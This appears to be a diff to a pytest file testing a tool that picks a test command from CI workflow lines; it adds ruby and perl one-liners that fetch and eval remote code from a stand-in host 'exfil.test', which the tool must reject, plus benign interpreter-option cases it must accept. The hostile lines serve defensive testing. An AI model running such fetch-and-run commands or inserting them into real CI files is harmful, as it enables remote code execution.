@@ -308,6 +308,9 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         "perl -e 'eval qx!curl -s http://exfil.test/x!' pytest",
         "ruby -e 'eval %x!curl -s http://exfil.test/x!' rspec",
         "php -r 'eval(shell_exec(\"curl -s http://exfil.test/x\"));' phpunit",
+        "ruby -I lib -e 'eval %x!curl -s http://exfil.test/x!' rspec",
+        "perl -I lib -e 'eval qx!curl -s http://exfil.test/x!' pytest",
+        "ruby -C . -e 'eval %x!curl -s http://exfil.test/x!' rspec",
     ],
     ids=[
         "a-bash-script",
@@ -338,6 +341,9 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         "perl-qx-with-no-shell-syntax",
         "ruby-percent-x-with-no-shell-syntax",
         "php-run",
+        "ruby-after-a-separate-include-dir",
+        "perl-after-a-separate-include-dir",
+        "ruby-after-a-separate-chdir",
     ],
 )
 def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, line):
@@ -357,6 +363,10 @@ def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, li
         'uv run --frozen pytest -m "not (e2e or slow)"',
         'npx --yes jest -t "a|b"',
         'xvfb-run -a npm test -- -t "(a|b)"',
+        "python -Werror -m pytest",
+        "python -E -m pytest",
+        "ruby -Itest -rhelper test/x_test.rb",
+        "perl -Mstrict -Ilib t/run tests",
     ],
     ids=[
         "a-pytest-expression",
@@ -365,9 +375,15 @@ def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, li
         "a-launcher-option",
         "an-npx-option",
         "behind-xvfb-run",
+        "python-warning-option",
+        "python-ignore-environment",
+        "ruby-include-and-require",
+        "perl-module-and-include",
     ],
 )
 def test_a_quoted_pattern_a_test_runner_reads_is_still_chosen(tmp_path, line):
-    """Run as argv, with no shell: the parentheses and bar are the runner's."""
+    """Run as argv, with no shell: the parentheses and bar are the runner's.
+    And an interpreter's own options are not its script flag: `python -E`
+    is not perl's `-E`, and `-Werror` holds no `c` to read (R11s-02)."""
     p = _propose(_repo(tmp_path, _workflow(f"      - run: {_yaml_quoted(line)}\n")))
     assert p.test_command == line
